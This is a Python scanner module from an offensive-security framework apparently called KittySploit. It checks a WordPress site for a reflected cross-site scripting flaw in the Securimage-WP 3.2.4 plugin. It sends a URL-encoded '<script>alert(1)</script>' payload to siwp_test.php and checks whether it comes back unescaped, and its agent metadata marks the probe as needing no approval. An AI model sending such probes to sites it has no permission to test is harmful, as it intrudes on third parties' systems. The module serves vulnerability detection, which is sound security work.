#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Securimage-WP 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Securimage-WP 3.2.4 - Cross-Site Scripting Detection',
        'description': 'WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'edb', 'wordpress', 'xss', 'wp-plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/38510',
            'http://web.archive.org/web/20210123054214/https://www.securityfocus.com/bid/59816/info',
        ],
    }

    def run(self):
        path = '/wp-content/plugins/securimage-wp/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Securimage-WP', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(1)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='WordPress Securimage-WP 3.2.4 - Cross-Site Scripting detected', path=path)
            return True
        return False

